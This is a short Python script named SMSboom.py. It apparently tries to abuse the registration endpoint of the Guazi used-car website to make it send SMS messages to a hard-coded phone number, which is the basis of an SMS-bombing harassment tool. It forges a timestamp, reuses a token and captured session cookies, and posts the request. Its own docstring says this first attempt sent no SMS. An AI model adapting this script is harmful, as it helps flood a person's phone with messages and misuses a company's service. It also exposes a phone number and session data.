#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/5/8 22:04
# @Author  : Roohom
# @Site    : 
# @File    : SMSboom.py
# @Software: PyCharm
"""
破解瓜子二手车的登录js，实现发短信

时间戳=(new Date).getTime()+ 864e5

本次尝试v1.0 没有返回信息，没有发短信

"""
import requests

baseurl = "https://www.guazi.com/zq_user/?act=register"


def getTimeNow():
    import time
    time = int(time.time()*1000) + 864000000
    time = int(time/1000)
    return time

data = {
    "phone":"18256993059",
    "time": str(getTimeNow()),
    "token": "ca4335388208374ba3c28ffa14fd5911"
}

headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "Connection": "keep-alive",
    "Content-Length": len(data),
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": "antipas=yE5e750z91285D3l311T5565605c; uuid=23de5174-8305-42b0-fb93-8add0c067d85; ganji_uuid=8617006169346087194609; lg=1; Hm_lvt_936a6d5df3f3d309bda39e92da3dd52f=1588944800; track_id=74809468183236608; cityDomain=chuzhou; clueSourceCode=%2A%2300; user_city_id=128; preTime=%7B%22last%22%3A1588991167%2C%22this%22%3A1588944796%2C%22pre%22%3A1588944796%7D; guazitrackersessioncadata=%7B%22ca_kw%22%3A%22-%22%7D; sessionid=ca09d2f7-1f41-4760-8111-9ebfb6de0b35; cainfo=%7B%22ca_a%22%3A%22-%22%2C%22ca_b%22%3A%22-%22%2C%22ca_s%22%3A%22pz_baidu%22%2C%22ca_n%22%3A%22pcbiaoti%22%2C%22ca_medium%22%3A%22-%22%2C%22ca_term%22%3A%22-%22%2C%22ca_content%22%3A%22%22%2C%22ca_campaign%22%3A%22%22%2C%22ca_kw%22%3A%22-%22%2C%22ca_i%22%3A%22-%22%2C%22scode%22%3A%22-%22%2C%22keyword%22%3A%22-%22%2C%22ca_keywordid%22%3A%22-%22%2C%22ca_transid%22%3A%22%22%2C%22platform%22%3A%221%22%2C%22version%22%3A1%2C%22track_id%22%3A%2274809468183236608%22%2C%22display_finance_flag%22%3A%22-%22%2C%22client_ab%22%3A%22-%22%2C%22guid%22%3A%2223de5174-8305-42b0-fb93-8add0c067d85%22%2C%22ca_city%22%3A%22chuzhou%22%2C%22sessionid%22%3A%22ca09d2f7-1f41-4760-8111-9ebfb6de0b35%22%7D; close_finance_popup=2020-05-09",
    "Host": "www.guazi.com",
    "Origin": "https://www.guazi.com",
    "Referer": "https://www.guazi.com/chuzhou/?ca_s=pz_baidu&ca_n=pcbiaoti&tk_p_mti=ad.pz_baidu.pcbiaoti.1.74809468183236608",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

requests.post(url=baseurl, data=data, headers=headers)